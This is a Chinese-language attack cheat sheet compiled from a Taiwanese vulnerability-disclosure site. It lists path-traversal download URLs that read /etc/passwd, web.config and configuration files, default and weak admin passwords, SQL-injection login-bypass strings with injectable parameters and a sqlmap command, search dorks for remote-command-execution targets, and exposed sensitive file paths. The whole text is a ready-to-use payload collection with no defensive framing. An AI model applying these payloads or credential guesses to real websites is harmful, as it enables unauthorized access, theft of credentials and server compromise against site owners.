无聊，翻下zeroday.hitcon.org（台湾省版乌云）,发现漏洞主要集中在SQL、XSS、任意文件下载、弱口令。XSS太鸡肋就没记录。后台弱口令admin/admin还是榜首，
而且台湾省的喜欢用二级或三级域名做后台密码，命令执行主要还是CMS和strurs框架，都有公开的exp。

### 任意文件下载
```
download_file.asp?file=
dl.asp?fileName=
download.asp?fileName=
Download.ashx?src=../app/loginchk.asp
downloads/getFile?file=../../../../../../../../etc/passwd&filename=passwd
view.php?v=1&pt=a&rn=../../library/site.inc.php&rt=pdf
ashx_prod_file.ashx?file_path=../web.config
get_file.php?file_name=../../include/setup.php
file_download.aspx?fileN=/Web&fileP=Web.config
file.php?f=../../../include/app_top.php
Download.ashx?u=L3dlYi5jb25maWc=&n=bm1tYmE=        参数base64编码
download.aspx?path=..\&file=web.config
download.aspx?table_name=&filename=../web.config
download.aspx?dlfn=../web.config
systemi/downloads.php?ServerFilename=../systemi/config.php
DownFile.aspx?pid=311502&fileName=../../../web.config
/download.php?file=YXR0YWNobWVudHMvcGhuZXQvY29tcGFueS9GMS54bHM=  路径base64编码
saveas.php?url=/admin/includes/config.php
getfile.ashx?filen=../web.config
readimage.php?file=../../../../../include/config.inc.php
```


### 弱密碼 (Weak Passwords)
```
管理員使用預設帳號密碼(admin, 1234)
弱口令訪問 admin /admin
帳號密碼通通留白
帳號密碼 dia:dia
s1 / test
test / test 
帳號: admin 密碼: gss (gss为网站域名)
```



### SQL
```
' or 1=1--   aspx
帳號: admin 密碼: 'or''='
帳號: 'or'=1 密碼: 'or'=1
帳號: " or "=' 密碼: " or "='
帳號: ' OR 2=2 -- 密碼: ' OR 2=2 --
index.php?kid=
ktv_01.asp?ID=27
/index.php/meeting/index/cat_id/8'  sqlmap -u /index.php/meeting/index/cat_id/8\*   \* 为自定义参数
index_show.php?fr=i&id=3159
edu_nthsbbs_new.php?acttype=show&id=A20190200062
news-detail.php?id=81
news1.php?inId=180
pages.php?sn=1
```
### 遠端命令執行 
```
inurl:"/cgi-bin/gs32/gsweb.cgi/ccd="
/cgi-bin/jbdic/gsweb.cgi
/drupal-7.34/
/drupal/?q=user/password
Ghostscript
ecshop
Adobe ColdFusion
```

### 敏感信息泄露
```
inurl:sybase_environment.inc
/.git/HEAD
sa.sql
vpn.doc proxy.doc
```
